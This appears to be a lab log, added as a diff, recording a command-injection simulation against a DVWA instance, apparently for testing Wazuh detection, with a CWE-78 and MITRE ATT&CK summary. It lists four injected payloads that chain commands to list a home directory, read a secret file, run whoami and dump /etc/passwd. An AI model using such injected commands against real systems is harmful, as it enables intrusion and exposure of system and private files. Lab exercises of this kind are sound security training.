@@ -1,0 +1,34 @@
+COMMAND INJECTION SIMULATION - BEFORE CUSTOM RULES
+Date: May 2, 2026
+Target: 192.168.1.17 (DVWA - Command Injection)
+
+=== PAYLOAD 1 ===
+Input: 192.168.1.17 & ls /home/jadihacker
+Hasil: List file di direktori jadihacker
+File yang ditemukan: eicar.com, quickbuck.exe, secret_document.txt, wazuh-agent.deb
+
+=== PAYLOAD 2 ===
+Input: 192.168.1.17 & cat /home/jadihacker/secret_document.txt
+Hasil: "THIS IS A SECRET DOCUMENT !!!"
+
+=== PAYLOAD 3 ===
+Input: 192.168.1.17 & whoami
+Hasil: www-data (user web server)
+
+=== PAYLOAD 4 ===
+Input: 192.168.1.17 & cat /etc/passwd
+Hasil: Seluruh isi file passwd, termasuk root, www-data, jadihacker, mysql, sshd
+
+=== KESIMPULAN ===
+Web app vulnerable to command injection (CWE-78)
+Attacker bisa:
+- Read file system (/etc/passwd)
+- Execute system commands (whoami, ls, cat)
+- Baca file rahasia di direktori user
+
+MITRE ATT&CK:
+- T1202: Indirect Command Execution
+- TA0002: Execution
+
+Wazuh Detection: (cek dashboard)
+- Alert yang muncul: [isi dari screenshot Wazuh lo]
